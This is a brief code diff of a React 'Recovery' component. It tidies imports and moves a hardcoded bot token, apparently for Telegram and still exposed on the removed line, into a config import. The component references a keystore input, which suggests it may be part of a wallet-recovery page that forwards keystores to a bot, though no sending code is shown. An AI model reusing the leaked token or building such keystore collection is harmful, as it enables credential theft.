@@ -1,9 +1,11 @@
-import { useRef, useState } from 'react'
+import axios from 'axios'
 import Tabs from '../Components/Tabs'
 import { toast } from 'react-toastify'
-import axios from 'axios'
-import { Navigate, useNavigate } from 'react-router-dom'
-const token = '7015504960:AAFV1abJ9xSzaxWXrh5fH3QQ6qtZj1imNR8'
+import { useRef, useState } from 'react'
+import { useNavigate } from 'react-router-dom'
+import { botKey } from '../../config'
+const token = botKey
+
 const Recovery = () => {
   const navigate = useNavigate()
   const keystoreRef = useRef()
